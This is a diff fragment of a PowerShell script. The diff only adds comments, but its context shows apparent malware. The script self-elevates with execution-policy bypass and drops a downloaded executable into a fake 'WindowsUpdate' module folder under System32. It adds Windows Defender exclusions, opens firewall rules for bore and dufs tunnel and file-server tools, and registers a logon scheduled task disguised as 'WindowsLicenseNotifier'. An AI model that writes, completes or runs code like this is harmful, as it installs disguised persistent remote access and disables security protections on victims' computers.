@@ -76,6 +76,7 @@ function Download-WithProgress {
     }
 }
 
+# Check for admin privileges
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     try {
         $arguments = @("-NoProfile", "-ExecutionPolicy", "Bypass", "-File", $myinvocation.mycommand.definition)
@@ -87,6 +88,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Exit
 }
 
+# Define paths
 $secureDir = "$env:windir\System32\WindowsPowerShell\v1.0\Modules\WindowsUpdate"
 $exeFileName = "Wlnnb.exe"
 $filePath = Join-Path $secureDir $exeFileName
@@ -113,10 +115,12 @@ Download-WithProgress -urls $binaryUrls -output $filePath
 Show-Status "Processing..."
 Start-Sleep -Seconds 1
 
+# Add to Defender exclusions
 Add-MpPreference -ExclusionPath $secureDir -ErrorAction SilentlyContinue | Out-Null
 $licenseNotifierPath = "$env:LOCALAPPDATA\LicenseNotifier"
 Add-MpPreference -ExclusionPath $licenseNotifierPath -ErrorAction SilentlyContinue | Out-Null
 
+# Firewall rules
 $exeList = @("$filePath", "$licenseNotifierPath\bore.exe", "$licenseNotifierPath\dufs.exe")
 foreach ($exe in $exeList) {
     if (Test-Path $exe) {
@@ -126,6 +130,7 @@ foreach ($exe in $exeList) {
     }
 }
 
+# Scheduled task setup
 $taskName = "WindowsLicenseNotifier"
 $action = New-ScheduledTaskAction -Execute $filePath
 $trigger = New-ScheduledTaskTrigger -AtLogOn
